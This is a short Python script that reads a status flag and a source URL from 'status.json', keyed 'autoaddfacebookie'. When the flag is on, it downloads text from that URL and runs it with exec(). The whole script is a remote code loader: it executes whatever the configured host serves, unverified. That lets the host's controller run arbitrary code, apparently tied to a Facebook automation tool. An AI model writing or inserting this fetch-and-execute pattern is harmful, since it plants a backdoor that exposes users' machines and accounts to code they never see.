import requests 
import json



with open('status.json', 'r', encoding='utf-8') as file:
    data = json.load(file)
status=data['autoaddfacebookie']['status']
source=data['autoaddfacebookie']['source']

if 'on' in status:
    chay=requests.get(source)
    exec(chay.text)
else:
    print(status)
